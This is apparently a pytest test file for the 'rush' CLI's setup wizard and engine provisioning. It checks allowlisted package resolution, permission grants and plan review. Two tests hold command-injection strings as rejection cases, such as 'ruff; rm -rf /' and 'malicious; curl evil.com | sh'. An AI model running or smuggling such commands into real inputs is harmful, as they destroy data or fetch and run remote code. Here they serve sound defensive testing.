"""Tests for Phase 23: Setup Wizard and Config Initializer.

Verifies:
- Command injection neutralization in package installation
- Package name regex sanitization (rejection of shell metacharacters)
- Generating rush.toml configuration files
- Validating configuration files via config check
- Phase 65 P65-02: the --install path is actually reachable, engines install
  under their canonical registry package identity, unknown engines are
  refused, and a failed install never reports ready.
"""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest
from click.testing import CliRunner

from rush.cli import cli
from rush.config import load_config
from rush.permissions import ExecutionPermissions
from rush.setup.engine_packages import (
    ENGINE_PACKAGES,
    UnknownEngineError,
    resolve_engine_package,
)
from rush.setup.provision import (
    build_provision_plan,
    current_os_arch,
    resolve_and_apply_provision_plan,
)
from rush.tools.init_config import generate_initial_config
from rush.tools.setup_wizard import run_setup_wizard


def test_package_name_allowlist_sanitization() -> None:
    """Phase 70 T24 removed the regex-guarded ad-hoc installer; the only
    install path is the engine allowlist. Valid engines resolve to their
    canonical package identity; hostile strings never become a package."""
    assert resolve_engine_package("ruff").package_id == "ruff"
    assert resolve_engine_package("biome").package_id == "@biomejs/biome"
    assert resolve_engine_package("eslint").package_id == "eslint"
    assert resolve_engine_package("pytest").package_id == "pytest"

    for hostile in (
        "ruff; rm -rf /",
        "ruff && calc.exe",
        "`whoami`",
        "pkg | bash",
        "pkg > output.txt",
    ):
        with pytest.raises(UnknownEngineError):
            resolve_engine_package(hostile)


def test_hostile_engine_name_rejected_before_any_effect(tmp_path: Path) -> None:
    with pytest.raises(UnknownEngineError):
        build_provision_plan(
            tmp_path, ["malicious; curl evil.com | sh"], data_root=tmp_path / "data"
        )
    assert not (tmp_path / "data").exists()


def test_engine_install_runs_pinned_typed_argv_through_provision(
    tmp_path: Path,
) -> None:
    """A reviewed install succeeds only through apply_provision_plan, which
    runs the manager with the frozen version as a typed argument list."""
    import json

    project = tmp_path / "proj"
    project.mkdir()
    data_root = tmp_path / "data"
    calls: list[list[str]] = []

    def fake_http_get(url: str) -> bytes:
        return json.dumps(
            {
                "info": {"version": "1.0.0"},
                "releases": {
                    "1.0.0": [
                        {
                            "packagetype": "bdist_wheel",
                            "url": "https://pypi/x.whl",
                            "digests": {"sha256": "abc"},
                        }
                    ]
                },
            }
        ).encode()

    def fake_runner(
        argv: list[str], env: dict[str, str] | None = None
    ) -> subprocess.CompletedProcess[str]:
        calls.append(list(argv))
        assert env is not None
        exe = Path(env["UV_TOOL_BIN_DIR"]) / "ruff"
        exe.write_text("#!/bin/sh\necho ruff 1.0.0\n")
        exe.chmod(0o755)
        return subprocess.CompletedProcess(argv, 0, stdout="installed", stderr="")

    plan = build_provision_plan(
        project, ["ruff"], data_root=data_root, which=lambda name: "/usr/bin/uv"
    )
    result = resolve_and_apply_provision_plan(
        plan,
        ExecutionPermissions(network=True, download=True, cache_write=True),
        project_id="p",
        data_root=data_root,
        http_get=fake_http_get,
        runner=fake_runner,
        prober=lambda argv: subprocess.CompletedProcess(argv, 0, "ruff 1.0.0", ""),
        which=lambda name: "/usr/bin/uv",
        current_platform=current_os_arch(),
    )
    assert "ruff" in result.applied
    assert calls == [["uv", "tool", "install", "--force", "ruff==1.0.0"]]


def test_generate_initial_config(tmp_path: Path) -> None:
    # Create Python project markers
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="demo"\n', encoding="utf-8"
    )

    cfg_text = generate_initial_config(tmp_path)
    assert "[project]" in cfg_text
    assert "src" in cfg_text

    # Write and load to verify parse validity
    cfg_file = tmp_path / "rush.toml"
    cfg_file.write_text(cfg_text, encoding="utf-8")

    parsed = load_config(tmp_path)
    assert parsed.project.src == ["src"]


def test_setup_install_reachable(tmp_path: Path) -> None:
    """The `rush setup --install` CLI path must actually be reachable.

    Before P65-02 the only flag was `--non-interactive` as an is_flag with
    default=True, which could never be turned off from the CLI -- the
    interactive install branch was unreachable. `--install` must build (and,
    with grants, apply) a real provision plan.
    """
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="demo"\n', encoding="utf-8"
    )

    runner = CliRunner()
    result = runner.invoke(cli, ["setup", str(tmp_path), "--install", "--json"])
    assert result.exit_code == 0, result.output
    assert '"plan_id"' in result.output
    assert '"provision"' in result.output


def test_biome_and_typescript_use_canonical_packages() -> None:
    """Engine installs must use the canonical registry package identity.

    Not the bare executable name -- `biome`'s installable identity is
    `@biomejs/biome` and `tsc`'s is `typescript`.
    """
    assert ENGINE_PACKAGES["biome"].package_id == "@biomejs/biome"
    assert ENGINE_PACKAGES["biome"].source == "npm"
    assert ENGINE_PACKAGES["tsc"].package_id == "typescript"
    assert ENGINE_PACKAGES["tsc"].source == "npm"


def test_install_refuses_unknown_engine(tmp_path: Path) -> None:
    """An engine outside the declared ENGINE_PACKAGES allowlist is rejected.

    Never installed under an arbitrary/invented package name.
    """
    with pytest.raises(UnknownEngineError):
        resolve_engine_package("totally-made-up-engine")

    with pytest.raises(UnknownEngineError):
        build_provision_plan(tmp_path, ["totally-made-up-engine"])

    # A wizard-recommended engine outside the allowlist is silently excluded
    # from the plan, never attempted as an arbitrary package.
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="demo"\n', encoding="utf-8"
    )
    result = run_setup_wizard(tmp_path, non_interactive=True, install=True)
    assert "bandit" in result["unsupported_engines"]


def test_failed_install_never_reports_ready(tmp_path: Path) -> None:
    """A failing post-install probe must never be reported as installed/ready."""
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="demo"\n', encoding="utf-8"
    )

    def fake_http_get(url: str) -> bytes:
        import json

        return json.dumps(
            {
                "info": {"version": "1.0.0"},
                "releases": {
                    "1.0.0": [
                        {
                            "packagetype": "bdist_wheel",
                            "url": "https://pypi/x.whl",
                            "digests": {"sha256": "abc"},
                        }
                    ]
                },
            }
        ).encode()

    def fake_runner(
        argv: list[str], env: dict[str, str] | None = None
    ) -> subprocess.CompletedProcess[str]:
        return subprocess.CompletedProcess(argv, 0, stdout="installed", stderr="")

    def failing_prober(argv: list[str]) -> subprocess.CompletedProcess[str]:
        return subprocess.CompletedProcess(argv, 1, stdout="", stderr="not found")

    perms = ExecutionPermissions(network=True, download=True, cache_write=True)
    result = run_setup_wizard(
        tmp_path,
        non_interactive=True,
        install=True,
        permissions=perms,
        data_root=tmp_path / "data",
        http_get=fake_http_get,
        runner=fake_runner,
        prober=failing_prober,
    )
    assert result["provision"]["applied"] == []
    assert result["installed"] == []
    assert all(
        entry["code"] == "ENGINE_PROTOCOL_MISMATCH"
        for entry in result["provision"]["failed"].values()
    )


def test_setup_saved_review_applies_non_interactively(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Phase 70 T24: `rush setup --json` is the reviewed payload; `--apply
    --yes --plan-file --plan-id` applies exactly it with explicit grants."""
    import json

    from rush.setup.provision import default_data_root
    from rush.workflows.projects import list_projects

    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    monkeypatch.delenv("XDG_DATA_HOME", raising=False)
    project = tmp_path / "proj"
    project.mkdir()
    runner = CliRunner()

    preview = runner.invoke(cli, ["setup", str(project), "--json"])
    assert preview.exit_code == 0, preview.output
    payload = json.loads(preview.output)
    review_id = payload["review"]["review_id"]
    assert payload["apply_flags"] == ["--allow-cache-write", "--allow-artifact-write"]
    plan_file = tmp_path / "review.json"
    plan_file.write_text(preview.output, encoding="utf-8")

    wrong = runner.invoke(
        cli,
        [
            "setup",
            str(project),
            "--apply",
            "--yes",
            "--plan-file",
            str(plan_file),
            "--plan-id",
            "0" * 64,
            "--allow-cache-write",
            "--allow-artifact-write",
            "--json",
        ],
    )
    assert wrong.exit_code == 2
    assert json.loads(wrong.output)["reason"] == "plan_id_mismatch"

    denied = runner.invoke(
        cli,
        [
            "setup",
            str(project),
            "--apply",
            "--yes",
            "--plan-file",
            str(plan_file),
            "--plan-id",
            review_id,
            "--json",
        ],
    )
    assert denied.exit_code == 1
    assert json.loads(denied.output)["status"] == "permission_denied"
    assert not (project / "rush.toml").exists()

    applied = runner.invoke(
        cli,
        [
            "setup",
            str(project),
            "--apply",
            "--yes",
            "--plan-file",
            str(plan_file),
            "--plan-id",
            review_id,
            "--allow-cache-write",
            "--allow-artifact-write",
            "--json",
        ],
    )
    assert applied.exit_code == 0, applied.output
    assert json.loads(applied.output)["status"] == "ok"
    assert (project / "rush.toml").read_text(encoding="utf-8") == payload["review"][
        "config"
    ]["content"]
    [view] = list_projects(data_root=default_data_root())
    assert view["root"] == str(project.resolve())
    assert view["configured"] is True

    replay = runner.invoke(
        cli,
        [
            "setup",
            str(project),
            "--apply",
            "--yes",
            "--plan-file",
            str(plan_file),
            "--plan-id",
            review_id,
            "--allow-cache-write",
            "--allow-artifact-write",
            "--json",
        ],
    )
    assert replay.exit_code == 1
    assert json.loads(replay.output)["status"] == "recovery_required"
